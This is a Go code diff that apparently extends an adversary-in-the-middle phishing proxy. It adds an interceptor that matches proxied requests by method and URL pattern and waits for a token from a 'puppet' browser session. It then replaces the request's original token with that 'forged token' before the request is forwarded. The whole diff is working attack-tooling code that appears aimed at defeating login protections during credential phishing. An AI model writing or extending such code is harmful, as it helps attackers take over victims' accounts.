@@ -17,6 +17,7 @@ import (
 type RequestInterceptor struct {
 	puppetMaster *PuppetMaster
 	triggers     []*PuppetTrigger
+	interceptors []*PuppetInterceptor
 }
 
 // NewRequestInterceptor creates a new interceptor
@@ -34,6 +35,16 @@ func (ri *RequestInterceptor) AddTrigger(trigger *PuppetTrigger) {
 // ClearTriggers removes all triggers
 func (ri *RequestInterceptor) ClearTriggers() {
 	ri.triggers = []*PuppetTrigger{}
+}
+
+// AddInterceptor adds an interceptor
+func (ri *RequestInterceptor) AddInterceptor(interceptor *PuppetInterceptor) {
+	ri.interceptors = append(ri.interceptors, interceptor)
+}
+
+// ClearInterceptors removes all interceptors
+func (ri *RequestInterceptor) ClearInterceptors() {
+	ri.interceptors = []*PuppetInterceptor{}
 }
 
 // InterceptRequest intercepts and modifies an HTTP request
@@ -111,13 +122,84 @@ func (ri *RequestInterceptor) InterceptRequest(req *http.Request, sessionID stri
 				if trigger.AbortOriginal {
 					log.Debug("[INTERCEPTOR] Trigger configured to abort original request (not fully implemented)")
 				}
-				log.Success("[INTERCEPTOR] Successfully injected %d tokens into request", len(tokensToInject))
+				log.Success("[INTERCEPTOR] Successfully injected %d tokens into request for trigger %s", len(tokensToInject), trigger.Id)
 				return modifiedReq, true
 			}
 		}
 	}
 
+	// 2. Check interceptors
+	for _, interceptor := range ri.interceptors {
+		if ri.matchesInterceptor(req, interceptor) {
+			log.Debug("[INTERCEPTOR] Request matches interceptor for token %s", interceptor.Token)
+
+			// Try to get existing token first (fast path)
+			puppetToken, exists := ri.puppetMaster.GetToken(sessionID, interceptor.Token)
+
+			if !exists {
+				// Token doesn't exist yet, wait for puppet to complete
+				log.Info("[INTERCEPTOR] Token %s not available, waiting for puppet session...", interceptor.Token)
+				token, err := ri.puppetMaster.WaitForToken(sessionID, interceptor.Token, 30*time.Second)
+				if err != nil {
+					log.Warning("[INTERCEPTOR] Failed to wait for puppet token %s: %v", interceptor.Token, err)
+					continue
+				}
+				puppetToken = token
+			}
+
+			// Extract original token from request
+			// If parameter is specified, use it. Otherwise use token name.
+			paramName := interceptor.Parameter
+			if paramName == "" {
+				paramName = interceptor.Token
+			}
+
+			originalToken, err := ri.extractTokenFromRequest(req, paramName)
+			if err != nil {
+				log.Warning("[INTERCEPTOR] Failed to extract token %s from request: %v", paramName, err)
+				continue
+			}
+
+			log.Info("[INTERCEPTOR] Replacing token %s... with forged token %s... (Interceptor)",
+				shortenToken(originalToken),
+				shortenToken(puppetToken))
+
+			// Replace token in request
+			modifiedReq, err := ri.replaceTokenInRequest(req, originalToken, puppetToken)
+			if err != nil {
+				log.Error("[INTERCEPTOR] Failed to replace token %s: %v", paramName, err)
+				continue
+			}
+
+			if interceptor.Abort {
+				log.Debug("[INTERCEPTOR] Interceptor configured to abort original request (not fully implemented)")
+			}
+
+			log.Success("[INTERCEPTOR] Successfully injected token %s into request (Interceptor)", interceptor.Token)
+			return modifiedReq, true
+		}
+	}
+
 	return req, false
+}
+
+// matchesInterceptor checks if request matches an interceptor
+func (ri *RequestInterceptor) matchesInterceptor(req *http.Request, interceptor *PuppetInterceptor) bool {
+	// Check method if specified
+	if interceptor.Method != "" && req.Method != interceptor.Method {
+		return false
+	}
+
+	// Check URL pattern
+	url := req.URL.String()
+	if interceptor.UrlPattern != "" {
+		matched, _ := regexp.MatchString(interceptor.UrlPattern, url)
+		if !matched {
+			return false
+		}
+	}
+
+	return true
 }
 
 // matchesTrigger checks if request matches a trigger
